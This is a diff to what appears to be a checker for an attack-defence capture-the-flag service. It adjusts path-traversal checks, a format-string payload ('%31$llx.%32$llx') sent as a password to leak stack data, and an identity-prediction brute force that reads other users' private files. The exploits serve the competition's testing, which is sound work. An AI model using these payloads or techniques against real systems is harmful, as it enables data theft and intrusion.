@@ -213,7 +213,7 @@ async def havoc_file_creation(task: HavocCheckerTaskMessage, logger: LoggerAdapt
     conn.writer.write(b"bury root_file\n")
     await conn.writer.drain()
     data = await conn.reader.readuntil(b"$ ")
-    if b"Can't bury treasure at sea" not in data:
+    if b"Can't bury at sea" not in data:
         raise MumbleException("Creating files in the root directory is possible")
 
     # 2. Try to create a file in another directory
@@ -226,7 +226,7 @@ async def havoc_file_creation(task: HavocCheckerTaskMessage, logger: LoggerAdapt
     await conn.writer.drain()
     data = await conn.reader.readuntil(b"$ ")
 
-    if b"Can only bury treasure where your ship is" not in data:
+    if b"Can only bury where your ship is" not in data:
         raise MumbleException("Path traversal is possible when creating files")
 
 @checker.putnoise(0)
@@ -387,7 +387,7 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%33$llx.%34$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
+    conn.writer.write(b'%31$llx.%32$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
@@ -521,49 +521,18 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
         raise MumbleException("No attack info provided")
 
     private_dir, private_file = task.attack_info.split('/')
-    await conn.reader.readuntil(b"$ ")
 
-    print("Task.address:", task.address)
+    seed, current_identity = exploit2.get_seed_and_current_identity(task.address, SERVICE_PORT)
+    matching_identities = exploit2.get_matching_identites(seed, current_identity, private_file)
+        
+    # Use ThreadPoolExecutor to parallelize the process_identity function
+    with ThreadPoolExecutor() as executor:
+        responses = executor.map(lambda identity: exploit2.process_identity(identity, private_file, private_dir, task.address, SERVICE_PORT), matching_identities)
 
-    # Get current unix time in seconds
-    timestamp = int(time.time())
-
-    # Testing on flags just created by the checker, so assume created in the two mins
-    timestamp -= 300
-
-    # Read the current identity to use for the exploit
-    identity = await conn.get_identity()
-
-    # Get potential flag identities (try 150 last connections to be safe)
-    potential_flags = exploit2.get_previous_users(200, timestamp, 1000, identity)
-
-    flag_found = threading.Event()
-    result_flag = None
-
-    def process_flag(potential_flag):
-        nonlocal result_flag
-        if flag_found.is_set():
-            return None  # Skip processing if flag is already found
-
-        response = exploit2.process_identity(potential_flag, private_dir, private_file, task.address, SERVICE_PORT)
-        # Check if the flag is in the response
+    # Iterate over the responses to find the flag
+    for response in responses:
         if flag := searcher.search_flag(response):
-            result_flag = flag
-            flag_found.set()  # Indicate that the flag is found
             return flag
-        return None
-
-    # Use ThreadPoolExecutor to parallelize the process_flag function
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(process_flag, potential_flag) for potential_flag in potential_flags]
-
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                break  # Exit the loop once the flag is found
-
-    if result_flag:
-        return result_flag
 
     raise MumbleException("flag not found: exploit(1)")
 
